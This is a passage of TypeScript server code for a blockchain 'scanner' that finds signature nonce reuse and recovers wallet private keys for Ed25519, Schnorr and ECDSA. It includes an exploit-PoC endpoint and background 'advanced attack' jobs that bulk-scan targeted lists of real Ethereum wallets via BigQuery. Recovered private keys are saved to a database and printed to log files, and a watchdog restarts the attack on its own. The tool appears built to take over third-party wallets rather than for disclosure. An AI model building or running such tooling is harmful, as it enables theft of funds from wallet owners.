    if (candidates.length === 0) return res.status(422).json({ error: "Could not determine blockchain from input format" });
    const primary = candidates[0];
    res.json({
      target,
      detected: primary,
      alternatives: candidates.slice(1),
      scanPlan: getScanPlan(primary),
    });
  } catch (err) {
    res.status(500).json({ error: "Detection failed", detail: String(err) });
  }
});

router.post("/auto-scan", async (req: Request, res: Response) => {
  try {
    const { target, forceChain } = req.body as { target: string; forceChain?: string };
    if (!target) return res.status(400).json({ error: "target required" });
    const result = await adaptiveScan(target, forceChain);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Auto-scan failed", detail: String(err) });
  }
});

// ── Batch scan — accepts up to 200 targets, runs with concurrency limit ─────
async function runConcurrent<T>(
  items: string[],
  concurrency: number,
  fn: (item: string, index: number) => Promise<T>
): Promise<T[]> {
  const results: T[] = new Array(items.length);
  let idx = 0;
  async function worker() {
    while (idx < items.length) {
      const i = idx++;
      results[i] = await fn(items[i], i);
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, items.length) }, worker));
  return results;
}

router.post("/batch-detect", (req: Request, res: Response) => {
  try {
    const { targets } = req.body as { targets: string[] };
    if (!Array.isArray(targets) || targets.length === 0) return res.status(400).json({ error: "targets array required" });
    const limited = targets.slice(0, 500);
    const results = limited.map(target => {
      const candidates = detectChain(target.trim());
      return {
        target: target.trim(),
        detected: candidates[0] ?? null,
        alternatives: candidates.slice(1),
        confidence: candidates[0]?.confidence ?? 0,
      };
    });
    res.json({ results, total: results.length });
  } catch (err) {
    res.status(500).json({ error: "Batch detect failed", detail: String(err) });
  }
});

router.post("/batch-scan", async (req: Request, res: Response) => {
  try {
    const { targets, concurrency = 4 } = req.body as { targets: string[]; concurrency?: number };
    if (!Array.isArray(targets) || targets.length === 0) return res.status(400).json({ error: "targets array required" });
    if (targets.length > 200) return res.status(400).json({ error: "Maximum 200 targets per batch request" });

    const cap = Math.min(Math.max(1, concurrency), 6);
    const results = await runConcurrent(targets, cap, async (target) => {
      const t0 = Date.now();
      try {
        const r = await adaptiveScan(target.trim());
        return { ...r, scanError: null };
      } catch (e) {
        const candidates = detectChain(target.trim());
        return {
          target: target.trim(),
          detectedChain: candidates[0] ?? null,
          alternativeCandidates: candidates.slice(1),
          hasVulnerability: false,
          vulnerabilityCount: 0,
          scanError: String(e),
          executionTimeMs: Date.now() - t0,
          scanTimestamp: new Date().toISOString(),
        };
      }
    });

    const vulnerable = results.filter(r => r.hasVulnerability).length;
    const errored    = results.filter(r => (r as Record<string, unknown>).scanError).length;

    res.json({
      results,
      summary: {
        total: results.length,
        vulnerable,
        clean: results.length - vulnerable - errored,
        errored,
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Batch scan failed", detail: String(err) });
  }
});

// ── Ed25519 / Solana scanner — accepts address OR tx signature ─────────────────
router.post("/ed25519-scan", async (req: Request, res: Response) => {
  try {
    const { target } = req.body as { target: string };
    if (!target) return res.status(400).json({ error: "target (address or tx signature) required" });
    const result = await scanSolana(target);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Ed25519 scan failed", detail: String(err) });
  }
});

router.post("/ed25519-recover", async (req: Request, res: Response) => {
  try {
    const { R, pubkey, S1, msg1, S2, msg2 } = req.body as Record<string, string>;
    if (!R || !S1 || !S2 || !msg1 || !msg2) return res.status(400).json({ error: "Missing fields" });
    const result = recoverEd25519PrivateKey(R, pubkey ?? "", S1, msg1, S2, msg2);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Recovery failed", detail: String(err) });
  }
});

// ── Polkadot / Sr25519 — accepts address OR extrinsic hash ───────────────────
router.post("/schnorr-scan", async (req: Request, res: Response) => {
  try {
    const { target, chain = "polkadot" } = req.body as { target: string; chain?: string };
    if (!target) return res.status(400).json({ error: "target (address or extrinsic hash) required" });
    const result = await scanPolkadot(target, chain);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Schnorr scan failed", detail: String(err) });
  }
});

router.post("/schnorr-recover", async (req: Request, res: Response) => {
  try {
    const { R, pubkey, s1, msg1, s2, msg2 } = req.body as Record<string, string>;
    if (!R || !s1 || !s2) return res.status(400).json({ error: "Missing fields" });
    const result = recoverSchnorrPrivateKey(R, pubkey ?? "", s1, msg1 ?? "", s2, msg2 ?? "");
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Recovery failed", detail: String(err) });
  }
});

// ── Monero — accepts tx hash(es), auto-scans surrounding blocks ───────────────
router.post("/monero-scan", async (req: Request, res: Response) => {
  try {
    const { target, blockWindow = 15 } = req.body as { target: string | string[]; blockWindow?: number };
    if (!target) return res.status(400).json({ error: "target (tx hash or array of tx hashes) required" });
    const result = await scanMonero(target, blockWindow);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Monero scan failed", detail: String(err) });
  }
});

router.post("/monero-keyimages", async (req: Request, res: Response) => {
  try {
    const { keyImages } = req.body as { keyImages: string[] };
    if (!Array.isArray(keyImages) || keyImages.length === 0) return res.status(400).json({ error: "keyImages array required" });
    const result = await checkKeyImages(keyImages);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Key image check failed", detail: String(err) });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// AUTONOMOUS BATCH JOB MANAGER — HEAD ADMIN ONLY
// All routes below require requireAdmin (isAdmin === true in DB).
// No employees, no Command Center subscribers — owner account only.
// ═══════════════════════════════════════════════════════════════════════════════

// List all batch jobs
router.get("/batch-jobs", requireAdmin, async (_req: Request, res: Response) => {
  try {
    const jobs = await db.select().from(batchScanJobsTable).orderBy(desc(batchScanJobsTable.createdAt));
    res.json({ jobs });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Create a new batch job (upload target list as text)
router.post("/batch-jobs", requireAdmin, async (req: Request, res: Response) => {
  try {
    const { name, targets, sourceName } = req.body as { name: string; targets: string[]; sourceName?: string };
    if (!name) return res.status(400).json({ error: "name required" });
    if (!Array.isArray(targets) || targets.length === 0) return res.status(400).json({ error: "targets array required" });
    const jobId = await createBatchJob({ name, sourceName, targets });
    res.json({ jobId, message: `Job created with ${targets.length} targets. Processing will begin automatically.` });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Get job status + metadata
router.get("/batch-jobs/:id", requireAdmin, async (req: Request, res: Response) => {
  try {
    const id = parseInt(req.params.id, 10);
    const [job] = await db.select().from(batchScanJobsTable).where(eq(batchScanJobsTable.id, id));
    if (!job) return res.status(404).json({ error: "Job not found" });
    res.json({ job });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Get paginated results for a job
router.get("/batch-jobs/:id/results", requireAdmin, async (req: Request, res: Response) => {
  try {
    const id     = parseInt(req.params.id, 10);
    const page   = Math.max(1, parseInt(String(req.query.page ?? "1"), 10));
    const limit  = Math.min(200, Math.max(1, parseInt(String(req.query.limit ?? "100"), 10)));
    const filter = String(req.query.filter ?? "all");
    const offset = (page - 1) * limit;

    let q = db.select().from(batchScanResultsTable).where(eq(batchScanResultsTable.jobId, id));
    // filter handled client-side from the returned results for simplicity

    const results = await db
      .select()
      .from(batchScanResultsTable)
      .where(eq(batchScanResultsTable.jobId, id))
      .orderBy(asc(batchScanResultsTable.id))
      .limit(limit)
      .offset(offset);

    const [{ count }] = await db
      .select({ count: sql<number>`count(*)::int` })
      .from(batchScanResultsTable)
      .where(eq(batchScanResultsTable.jobId, id));

    res.json({ results, total: count, page, limit, pages: Math.ceil(count / limit) });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Get only vulnerable results (for quick findings view)
router.get("/batch-jobs/:id/findings", requireAdmin, async (req: Request, res: Response) => {
  try {
    const id = parseInt(req.params.id, 10);
    const findings = await db
      .select()
      .from(batchScanResultsTable)
      .where(and(
        eq(batchScanResultsTable.jobId, id),
        eq(batchScanResultsTable.hasVulnerability, true),
      ))
      .orderBy(desc(batchScanResultsTable.vulnerabilityCount));
    res.json({ findings, count: findings.length });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Pause / resume / cancel a job
router.post("/batch-jobs/:id/pause",   requireAdmin, async (req: Request, res: Response) => {
  const id = parseInt(req.params.id, 10);
  await db.update(batchScanJobsTable).set({ status: "paused" }).where(eq(batchScanJobsTable.id, id));
  res.json({ ok: true, status: "paused" });
});
router.post("/batch-jobs/:id/resume",  requireAdmin, async (req: Request, res: Response) => {
  const id = parseInt(req.params.id, 10);
  await db.update(batchScanJobsTable).set({ status: "pending" }).where(eq(batchScanJobsTable.id, id));
  res.json({ ok: true, status: "pending" });
});
router.post("/batch-jobs/:id/cancel",  requireAdmin, async (req: Request, res: Response) => {
  const id = parseInt(req.params.id, 10);
  await db.update(batchScanJobsTable).set({ status: "cancelled" }).where(eq(batchScanJobsTable.id, id));
  res.json({ ok: true, status: "cancelled" });
});
router.delete("/batch-jobs/:id",       requireAdmin, async (req: Request, res: Response) => {
  const id = parseInt(req.params.id, 10);
  await db.delete(batchScanJobsTable).where(eq(batchScanJobsTable.id, id));
  res.json({ ok: true });
});

// List saved report files for a job
router.get("/batch-jobs/:id/report-files", requireAdmin, async (req: Request, res: Response) => {
  try {
    const id = parseInt(req.params.id, 10);
    const [job] = await db.select().from(batchScanJobsTable).where(eq(batchScanJobsTable.id, id));
    if (!job?.reportDir || !fs.existsSync(job.reportDir)) {
      return res.json({ files: [], reportDir: null });
    }
    const files = fs.readdirSync(job.reportDir).map(f => ({
      name: f,
      size: fs.statSync(path.join(job.reportDir!, f)).size,
      path: path.join(job.reportDir!, f),
    }));
    res.json({ files, reportDir: job.reportDir });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// Download a specific report file
router.get("/batch-jobs/:id/download/:filename", requireAdmin, async (req: Request, res: Response) => {
  try {
    const id = parseInt(req.params.id, 10);
    const [job] = await db.select().from(batchScanJobsTable).where(eq(batchScanJobsTable.id, id));
    if (!job?.reportDir) return res.status(404).json({ error: "No report available" });
    const filePath = path.join(job.reportDir, req.params.filename);
    if (!fs.existsSync(filePath) || !filePath.startsWith(getReportsDir())) {
      return res.status(404).json({ error: "File not found" });
    }
    res.download(filePath);
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// List all saved reports across all jobs
router.get("/reports", requireAdmin, async (_req: Request, res: Response) => {
  try {
    const reportsDir = getReportsDir();
    if (!fs.existsSync(reportsDir)) return res.json({ reports: [] });
    const dirs = fs.readdirSync(reportsDir, { withFileTypes: true })
      .filter(d => d.isDirectory())
      .map(d => {
        const dirPath = path.join(reportsDir, d.name);
        const files = fs.readdirSync(dirPath).map(f => {
          const s = fs.statSync(path.join(dirPath, f));
          return { name: f, sizeBytes: s.size, modifiedAt: s.mtime };
        });
        return { folderName: d.name, path: dirPath, files };
      });
    res.json({ reports: dirs, reportsRoot: reportsDir });
  } catch (err) { res.status(500).json({ error: String(err) }); }
});

// ── Application Penetration Test ─────────────────────────────────────────────
router.post("/pentest/app", async (_req: Request, res: Response) => {
  try {
    const report = await runApplicationPenTest();
    res.json(report);
  } catch (err) {
    res.status(500).json({ error: "Pen test failed", detail: String(err) });
  }
});

// ── Exploit PoC lookup by vulnerability category ──────────────────────────────
router.get("/exploits/:category", (req: Request, res: Response) => {
  const poc = generateExploit(req.params.category, req.params.category);
  if (!poc) return res.status(404).json({ error: "No exploit PoC for this category" });
  res.json(poc);
});

// ── BigQuery bulk r-value scan ────────────────────────────────────────────────
// POST /api/quantum/bigquery-scan
// Body: { addresses: string[] }   (or omit to use the current job-5 wallet list)
router.post("/bigquery-scan", requireAdmin, async (req: Request, res: Response) => {
  if (!isBigQueryConfigured()) {
    return res.status(400).json({
      error: "GOOGLE_BIGQUERY_KEY not configured",
      instructions: [
        "1. Go to console.cloud.google.com",
        "2. IAM & Admin → Service Accounts → Create service account",
        "3. Grant roles: BigQuery User + BigQuery Data Viewer",
        "4. Keys tab → Add Key → JSON → download the file",
        "5. Copy the ENTIRE JSON content into Secrets as GOOGLE_BIGQUERY_KEY",
      ],
    });
  }

  try {
    let addresses: string[] = req.body?.addresses ?? [];

    // If no addresses supplied, pull from the current wallet job target file
    if (addresses.length === 0) {
      const [job] = await db.select().from(batchScanJobsTable)
        .where(eq(batchScanJobsTable.sourceName, "sillytuna-wallets"))
        .orderBy(desc(batchScanJobsTable.id))
        .limit(1);

      if (job?.targetsFile && fs.existsSync(job.targetsFile)) {
        addresses = fs.readFileSync(job.targetsFile, "utf8")
          .split("\n").map(l => l.trim()).filter(l => l.startsWith("0x"));
      }
    }

    if (addresses.length === 0) {
      return res.status(400).json({ error: "No addresses provided and no wallet job found" });
    }

    res.json({ status: "started", addressCount: addresses.length, message: "BigQuery scan running in background — check server logs for results" });

    // Run async in background
    setImmediate(async () => {
      try {
        const results = await bulkScanViaBigQuery(addresses);
        const vulnerable = results.filter(r => r.hasVulnerability);
        const keysFound  = vulnerable.filter(r => r.nonceReusePairs.some(p => p.recovery.success && p.recovery.addressMatches));

        // Save any key finds to the DB
        for (const r of keysFound) {
          const pair = r.nonceReusePairs.find(p => p.recovery.success && p.recovery.addressMatches)!;
          await db.insert(batchScanResultsTable).values({
            jobId:              null,
            target:             r.address,
            detectedChain:      "ethereum",
            displayName:        "Ethereum (ETH) — BigQuery",
            schemeLabel:        "secp256k1-ecdsa",
            signatureScheme:    "secp256k1-ecdsa",
            hasVulnerability:   true,
            vulnerabilityCount: r.nonceReusePairs.length,
            recoveredPrivateKey: pair.recovery.privateKey,
            recoveredNonceK:    pair.recovery.nonceK,
            sharedRValue:       pair.sharedR,
            rawResult:          r as unknown as Record<string, unknown>,
          });
        }

        console.log(`BigQuery scan complete: ${results.length} addresses, ${vulnerable.length} vulnerable, ${keysFound.length} keys recovered`);
      } catch (err) {
        console.error("BigQuery scan failed:", err);
      }
    });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// GET /api/quantum/bigquery-status — check if BigQuery is configured
router.get("/bigquery-status", requireAdmin, (_req: Request, res: Response) => {
  res.json({
    configured: isBigQueryConfigured(),
    message: isBigQueryConfigured()
      ? "BigQuery is configured — ready to run bulk scans"
      : "Set GOOGLE_BIGQUERY_KEY in secrets to enable BigQuery scanning",
  });
});

// ── Advanced Attack Runner ────────────────────────────────────────────────────
// State shared across requests for the long-running background job
const advAttackState = {
  running:   false,
  startedAt: null as string | null,
  log:       [] as string[],
  lastReport: null as string | null,
};

// POST /api/quantum/advanced-attack-scan/internal — localhost only, no Clerk auth needed
router.post("/advanced-attack-scan/internal", async (req: Request, res: Response) => {
  const secret = req.headers["x-internal-secret"];
  if (!secret || secret !== process.env.SESSION_SECRET) {
    res.status(403).json({ error: "Forbidden" });
    return;
  }
  req.body = req.body ?? {};
  // Fall through to the main handler below by cloning the logic
  const limit    = Number(req.body?.limit)    || 2089;
  const targeted = req.body?.targeted !== false;
  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
  fs.mkdirSync(reportsDir, { recursive: true });

  if (advAttackState.running) {
    res.status(409).json({ error: "Already running" });
    return;
  }
  advAttackState.running   = true;
  advAttackState.startedAt = new Date().toISOString();
  advAttackState.log       = [];
  res.json({ status: "started", limit, targeted });

  setImmediate(async () => {
    const push = (msg: string) => { advAttackState.log.push(`[${new Date().toTimeString().slice(0,8)}] ${msg}`); };
    try {
      const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/micro-targets.txt";
      const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
      const srcFile      = (targeted && fs.existsSync(targetedFile)) ? targetedFile : allFile;
      const addresses = fs.readFileSync(srcFile, "utf8")
        .split("\n").map((l: string) => l.trim().toLowerCase())
        .filter((l: string) => l.startsWith("0x"))
        .slice(0, limit);
      push(`Starting — ${addresses.length} addresses from ${path.basename(srcFile)}`);
      const results = await bulkScanViaBigQuery(addresses, (done, total) => {
        if (done % 100 === 0) push(`Progress: ${done}/${total}`);
      });
      let totalFindings = 0; let verifiedKeys = 0; const allKeys: string[] = [];
      for (const r of results) {
        totalFindings += (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length;
        const keys = r.recoveredKeys ?? [];
        verifiedKeys += keys.length; allKeys.push(...keys);
        if (keys.length > 0 || r.hasVulnerability) {
          try {
            await db.insert(batchScanResultsTable).values({
              jobId: null, target: r.address, detectedChain: "ethereum",
              displayName: "Ethereum (ETH) — Advanced Attack", schemeLabel: "secp256k1-ecdsa",
              signatureScheme: "secp256k1-ecdsa", hasVulnerability: true,
              vulnerabilityCount: totalFindings, recoveredPrivateKey: keys[0] ?? null,
              rawResult: r as unknown as Record<string, unknown>,
            });
          } catch {}
        }
      }
      const summary = { timestamp: new Date().toISOString(), addressesScanned: results.length,
        totalFindings, verifiedKeys, recoveredKeys: [...new Set(allKeys)], log: advAttackState.log };
      const outFile = path.join(reportsDir, `scan-${Date.now()}.json`);
      fs.writeFileSync(outFile, JSON.stringify(summary, null, 2));
      advAttackState.lastReport = outFile;
      push(`Complete — ${totalFindings} findings, ${verifiedKeys} keys`);
    } catch (err) {
      push(`ERROR: ${String(err)}`);
    } finally {
      advAttackState.running = false;
    }
  });
});

// POST /api/quantum/advanced-attack-scan
router.post("/advanced-attack-scan", requireAdmin, async (req: Request, res: Response) => {
  if (advAttackState.running) {
    res.status(409).json({ error: "Advanced attack scan already running", state: advAttackState });
    return;
  }

  const limit    = Number(req.body?.limit)    || 2000;
  const targeted = req.body?.targeted !== false;
  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
  fs.mkdirSync(reportsDir, { recursive: true });

  advAttackState.running   = true;
  advAttackState.startedAt = new Date().toISOString();
  advAttackState.log       = [];

  res.json({ status: "started", limit, targeted, message: "Advanced attack scan running in background" });

  setImmediate(async () => {
    const push = (msg: string) => { advAttackState.log.push(`[${new Date().toTimeString().slice(0,8)}] ${msg}`); };
    try {
      const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/targeted-wallets.txt";
      const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
      const srcFile      = (targeted && fs.existsSync(targetedFile)) ? targetedFile : allFile;

      const addresses = fs.readFileSync(srcFile, "utf8")
        .split("\n").map((l: string) => l.trim().toLowerCase())
        .filter((l: string) => l.startsWith("0x"))
        .slice(0, limit);

      push(`Starting advanced attack scan — ${addresses.length} addresses`);

      const results = await bulkScanViaBigQuery(addresses, (done, total) => {
        if (done % 100 === 0) push(`Progress: ${done}/${total} addresses`);
      });

      // Collect all findings
      let totalFindings   = 0;
      let verifiedKeys    = 0;
      const allRecoveredKeys: string[] = [];

      for (const r of results) {
        const adv = r.advancedFindings ?? [];
        totalFindings += adv.length + r.nonceReusePairs.length;
        const keys = r.recoveredKeys ?? [];
        verifiedKeys += keys.length;
        allRecoveredKeys.push(...keys);

        // Persist any recovered keys to DB
        if (keys.length > 0 || r.hasVulnerability) {
          try {
            await db.insert(batchScanResultsTable).values({
              jobId:              null,
              target:             r.address,
              detectedChain:      "ethereum",
              displayName:        "Ethereum (ETH) — Advanced Attack",
              schemeLabel:        "secp256k1-ecdsa",
              signatureScheme:    "secp256k1-ecdsa",
              hasVulnerability:   true,
              vulnerabilityCount: totalFindings,
              recoveredPrivateKey: keys[0] ?? null,
              rawResult:          r as unknown as Record<string, unknown>,
            });
          } catch {}
        }
      }

      const ensAddressHits = results.filter(r => r.ensName).length;
      const allInteractionEnsInternal: Record<string, string> = {};
      for (const r of results) {
        if (r.interactionEns) Object.assign(allInteractionEnsInternal, r.interactionEns);
      }

      const summary = {
        timestamp:        new Date().toISOString(),
        addressesScanned: results.length,
        totalFindings,
        verifiedKeys,
        recoveredKeys:    [...new Set(allRecoveredKeys)],
        ens: {
          targetAddressesWithEns:           ensAddressHits,
          uniqueInteractionAddressesWithEns: Object.keys(allInteractionEnsInternal).length,
          interactionEnsDirectory:           allInteractionEnsInternal,
        },
        addresses: results.map(r => ({
          address:         r.address,
          ensName:         r.ensName ?? null,
          hasVulnerability: r.hasVulnerability,
          findings:        (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length,
          keys:            r.recoveredKeys ?? [],
          interactionEns:  r.interactionEns ?? {},
        })),
        log: advAttackState.log,
      };

      const outFile = path.join(reportsDir, `scan-${Date.now()}.json`);
      fs.writeFileSync(outFile, JSON.stringify(summary, null, 2));
      advAttackState.lastReport = outFile;

      push(`Complete — ${totalFindings} findings, ${verifiedKeys} keys recovered`);
      push(`Report: ${outFile}`);
    } catch (err) {
      push(`ERROR: ${String(err)}`);
    } finally {
      advAttackState.running = false;
    }
  });
});

// GET /api/quantum/advanced-attack-status
router.get("/advanced-attack-status", requireAdmin, (_req: Request, res: Response) => {
  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
  let reports: string[] = [];
  try {
    reports = fs.readdirSync(reportsDir)
      .filter(f => f.endsWith(".json"))
      .map(f => path.join(reportsDir, f))
      .sort().reverse().slice(0, 10);
  } catch {}

  res.json({
    ...advAttackState,
    reports,
    log: advAttackState.log.slice(-50), // last 50 log lines
  });
});

// GET /api/quantum/advanced-attack-report/:filename
router.get("/advanced-attack-report/:filename", requireAdmin, (req: Request, res: Response) => {
  const reportsDir = path.join(getReportsDir(), "advanced-attacks");
  const safe       = path.basename(req.params.filename);
  const full       = path.join(reportsDir, safe);
  if (!fs.existsSync(full)) return res.status(404).json({ error: "Report not found" });
  try {
    res.json(JSON.parse(fs.readFileSync(full, "utf8")));
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// AUTONOMOUS BACKGROUND WATCHDOG
// Runs entirely inside the server process — no external scripts needed.
// • Auto-starts the scan 30 s after boot (if nothing running and no recent report)
// • Writes a heartbeat + scan log every 5 minutes to proxhq-reports/monitor.log
// • Auto-restarts the scan if it ends with an error
// ─────────────────────────────────────────────────────────────────────────────
{
  const MONITOR_LOG   = "/home/runner/workspace/proxhq-reports/monitor.log";
  const STATUS_FILE   = "/home/runner/workspace/proxhq-reports/monitor-status.txt";
  const REPORTS_DIR   = path.join(getReportsDir(), "advanced-attacks");
  const SCAN_LIMIT    = 2089;
  const SCAN_TARGETED = true;

  const mlog = (msg: string) => {
    const line = `[${new Date().toISOString()}] ${msg}\n`;
    try { fs.appendFileSync(MONITOR_LOG, line); } catch {}
    console.info("[MONITOR]", msg);
  };

  const setStatus = (s: string) => {
    try { fs.writeFileSync(STATUS_FILE, `${s}\n`); } catch {}
    mlog(`STATUS: ${s}`);
  };

  /** True when there is a completed report newer than the pre-scan sentinel */
  const hasCompletedReport = (): string | null => {
    const sentinel = path.join(REPORTS_DIR, "scan-1777395046918.json");
    try {
      const sentinelMtime = fs.statSync(sentinel).mtimeMs;
      const files = fs.readdirSync(REPORTS_DIR)
        .filter(f => f.startsWith("scan-") && f.endsWith(".json"))
        .map(f => path.join(REPORTS_DIR, f))
        .filter(f => fs.statSync(f).mtimeMs > sentinelMtime);
      return files.length > 0 ? files[0] : null;
    } catch { return null; }
  };

  /** Fire the scan exactly like the internal endpoint does */
  const startScan = () => {
    if (advAttackState.running) return;
    advAttackState.running   = true;
    advAttackState.startedAt = new Date().toISOString();
    advAttackState.log       = [];

    const push = (msg: string) => {
      advAttackState.log.push(`[${new Date().toTimeString().slice(0, 8)}] ${msg}`);
    };

    mlog("Watchdog: triggering scan via setImmediate");

    setImmediate(async () => {
      try {
        const targetedFile = "/home/runner/workspace/proxhq-reports/jobs/micro-targets.txt";
        const allFile      = "/home/runner/workspace/proxhq-reports/jobs/job-5.txt";
        const srcFile      = (SCAN_TARGETED && fs.existsSync(targetedFile)) ? targetedFile : allFile;
        const addresses    = fs.readFileSync(srcFile, "utf8")
          .split("\n").map((l: string) => l.trim().toLowerCase())
          .filter((l: string) => l.startsWith("0x"))
          .slice(0, SCAN_LIMIT);

        push(`Starting — ${addresses.length} addresses from ${path.basename(srcFile)}`);
        setStatus(`SCAN_RUNNING (${addresses.length} addresses)`);

        // JSONL checkpoint — write each result as it arrives so findings survive crashes
        const checkpointPath = path.join(REPORTS_DIR, "checkpoint.jsonl");
        const cpStream = fs.createWriteStream(checkpointPath, { flags: "w" });

        const results = await bulkScanViaBigQuery(
          addresses,
          (done, total) => {
            if (done % 100 === 0) push(`Progress: ${done}/${total} addresses`);
          },
          (r) => {
            // Stream each result to checkpoint file (minified per-line)
            const compact = {
              address:     r.address,
              ensName:     r.ensName ?? null,
              sigs:        r.signaturesExtracted,
              vulnerable:  r.hasVulnerability,
              rPairCount:  r.nonceReusePairs.length,
              advCount:    (r.advancedFindings?.length ?? 0),
              keys:        r.recoveredKeys ?? [],
            };
            try { cpStream.write(JSON.stringify(compact) + "\n"); } catch {}

            // Immediately surface any r-collision / key recovery findings
            if (r.nonceReusePairs.length > 0) {
              mlog(`NONCE REUSE: ${r.address} — ${r.nonceReusePairs.length} shared-r pair(s)`);
              for (const p of r.nonceReusePairs) {
                const k = p.recovery;
                if (k.success && k.addressMatches) {
                  mlog(`KEY RECOVERED: ${r.address} -> ${k.privateKey}`);
                }
              }
            }
            if ((r.recoveredKeys?.length ?? 0) > 0) {
              mlog(`KEY(S) via advanced attack: ${r.address} -> ${r.recoveredKeys!.join(", ")}`);
            }
          },
          true,  // skipEns — ENS enrichment runs as separate post-process after report is written
        );

        let totalFindings = 0, verifiedKeys = 0;
        const allRecoveredKeys: string[] = [];
        for (const r of results) {
          const adv = r.advancedFindings ?? [];
          totalFindings += adv.length + r.nonceReusePairs.length;
          const keys = r.recoveredKeys ?? [];
          verifiedKeys += keys.length;
          allRecoveredKeys.push(...keys);
          if (keys.length > 0 || r.hasVulnerability) {
            try {
              await db.insert(batchScanResultsTable).values({
                jobId:       null,
                targetAddress: r.address,
                chain:       r.chain,
                vulnerable:  r.hasVulnerability,
                findings:    JSON.stringify([...(r.advancedFindings ?? []), ...r.nonceReusePairs]),
                recoveredPrivateKey: keys[0] ?? null,
                scannedAt:   new Date(),
              } as any);
            } catch {}
          }
        }

        cpStream.end(); // close checkpoint stream

        // ENS summary across all results
        const ensAddressHits   = results.filter(r => r.ensName).length;
        const allInteractionEns: Record<string, string> = {};
        for (const r of results) {
          if (r.interactionEns) Object.assign(allInteractionEns, r.interactionEns);
        }
        const ensInteractionHits = Object.keys(allInteractionEns).length;

        push(`Scan complete — ${addresses.length} addresses, ${totalFindings} findings, ${verifiedKeys} recovered keys`);
        push(`ENS names resolved — ${ensAddressHits} target addresses, ${ensInteractionHits} unique interaction addresses`);
        if (allRecoveredKeys.length > 0) {
          push(`RECOVERED KEYS: ${allRecoveredKeys.slice(0, 10).join(", ")}`);
        }

        fs.mkdirSync(REPORTS_DIR, { recursive: true });
        const reportPath = path.join(REPORTS_DIR, `scan-${Date.now()}.json`);
        const report = {
          generatedAt:         new Date().toISOString(),
          totalAddresses:      addresses.length,
          vulnerableAddresses: results.filter(r => r.hasVulnerability).length,
          totalFindings,
          verifiedKeys,
          recoveredKeys:       allRecoveredKeys,
          ens: {
            targetAddressesWithEns:      ensAddressHits,
            uniqueInteractionAddressesWithEns: ensInteractionHits,
            interactionEnsDirectory:     allInteractionEns,
          },
          topVulnerable: results.filter(r => r.hasVulnerability).slice(0, 20).map(r => ({
            address:        r.address,
            ensName:        r.ensName ?? null,
            findings:       (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length,
            keys:           r.recoveredKeys ?? [],
            interactionEns: r.interactionEns ?? {},
          })),
          allAddresses: results.map(r => ({
            address:        r.address,
            ensName:        r.ensName ?? null,
            hasVulnerability: r.hasVulnerability,
            findings:       (r.advancedFindings?.length ?? 0) + r.nonceReusePairs.length,
            keys:           r.recoveredKeys ?? [],
            interactionEns: r.interactionEns ?? {},
          })),
        };
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));

        mlog(`=== SCAN COMPLETE: ${totalFindings} findings, ${verifiedKeys} keys recovered ===`);
        mlog(`ENS resolved: ${ensAddressHits} target wallets, ${ensInteractionHits} interaction counterparties`);
        mlog(`Report saved: ${reportPath}`);
        if (allRecoveredKeys.length > 0) {
          mlog(`RECOVERED PRIVATE KEYS (${allRecoveredKeys.length}):`);
          for (const k of allRecoveredKeys) mlog(`  ${k}`);
        }
        setStatus(`DONE — ${totalFindings} findings, ${verifiedKeys} keys`);
        advAttackState.lastReport = reportPath;
      } catch (err) {
        push(`ERROR: ${String(err)}`);
        mlog(`Scan error: ${String(err)}`);
        setStatus(`ERROR: ${String(err)}`);
        try { cpStream.end(); } catch {}
      } finally {
        advAttackState.running = false;
      }
    });
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // THREAT SCANNER — multi-vector blockchain attack detection
  // ═══════════════════════════════════════════════════════════════════════════

  const THREAT_REPORTS_DIR = path.join(getReportsDir(), "threat-scans");
  fs.mkdirSync(THREAT_REPORTS_DIR, { recursive: true });

  interface ThreatScanState {
    running:    boolean;
    progress:   number;
    phase:      string;
    lastReport: string | null;
    log:        string[];
    error:      string | null;
  }

  const threatState: ThreatScanState = {
    running:    false,
    progress:   0,
    phase:      "idle",
    lastReport: null,
    log:        [],
    error:      null,
  };

  function getThreatReport(): string | null {
    try {
      const files = fs.readdirSync(THREAT_REPORTS_DIR)
        .filter(f => f.startsWith("threat-scan-") && f.endsWith(".json"))
        .map(f => ({ f, mtime: fs.statSync(path.join(THREAT_REPORTS_DIR, f)).mtimeMs }))
        .sort((a, b) => b.mtime - a.mtime);
      return files.length ? path.join(THREAT_REPORTS_DIR, files[0].f) : null;
    } catch { return null; }
  }

  async function startThreatScan(addresses: string[]): Promise<void> {
    if (threatState.running) return;
    threatState.running  = true;
    threatState.progress = 0;
    threatState.phase    = "starting";
    threatState.error    = null;
    threatState.log      = [`[${new Date().toISOString()}] Threat scan started — ${addresses.length} addresses`];

    setImmediate(async () => {
      try {
        const summary = await runThreatScan(addresses, (phase, pct) => {
          threatState.phase    = phase;
          threatState.progress = pct;
